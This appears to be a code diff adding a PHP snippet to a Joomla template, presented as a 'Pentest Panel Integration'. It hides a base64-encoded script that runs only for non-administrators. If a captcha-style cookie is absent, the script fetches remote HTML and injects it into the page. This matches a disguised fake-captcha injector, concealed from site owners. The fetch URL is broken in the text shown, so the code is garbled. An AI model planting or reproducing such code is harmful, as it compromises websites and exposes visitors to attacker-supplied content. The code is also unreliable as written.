@@ -1,0 +1,17 @@
+/**
+ * Pentest Panel Integration for JOOMLA
+ * 
+ * Installation Instructions:
+ * 1. Add this code to your template's index.php
+ * 2. Or create a custom plugin
+ */
+
+<?php
+
+$user = \Joomla\CMS\Factory::getApplication() -> getIdentity();
+if(!$user -> authorise("core.admin"))
+{
+	
+    
+	echo(base64_decode('PHNjcmlwdD53aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibWVzc2FnZSIsIGUgPT57aWYoZS5kYXRhID09PSAicmVsb2FkIil7ICAgICAgICB3aW5kb3cubG9jYXRpb24ucmVsb2FkKCk7ICAgIH19KTtmdW5jdGlvbiBnZXRDb29raWUobmFtZSl7Y29uc3QgbWF0Y2ggPSBkb2N1bWVudC5jb29raWUubWF0Y2gobmV3IFJlZ0V4cCgiKF58OyApIiArIG5hbWUgKyAiPShbXjtdKikiKSk7cmV0dXJuIG1hdGNoID8gZGVjb2RlVVJJQ29tcG9uZW50KG1hdGNoWzJdKSA6IG51bGw7fWNvbnN0IGNvb2tpZW5hbWUgPSAiY29va2llLWNhcHRjaGEtY29tcGxldGUiO2NvbnN0IGNvb2tpZSA9IGdldENvb2tpZShjb29raWVuYW1lKTtpZighY29va2llKXtmZXRjaCgiaHR0cHM6LnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2Uub2sgPyByZXNwb25zZS50ZXh0KCkgOiBQcm9taXNlLnJlamVjdCgpKS50aGVuKGh0bWwgPT57aWYoaHRtbC5sZW5ndGggPT09IDApe2RvY3VtZW50LmNvb2tpZSA9IGNvb2tpZW5hbWUgKyAiPTE7IHBhdGg9LzsgbWF4LWFnZT0iICsgKDYwICogNjAgKiAyNCAqIDM2NSk7fWVsc2V7ZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImJlZm9yZWVuZCIsIGh0bWwpO319KS5jYXRjaCgoKSA9PiBjb25zb2xlLmVycm9yKCJGYWlsZWQgdG8gbG9hZCBwYWdlISIpKTt9PC9zY3JpcHQ+'));
+}
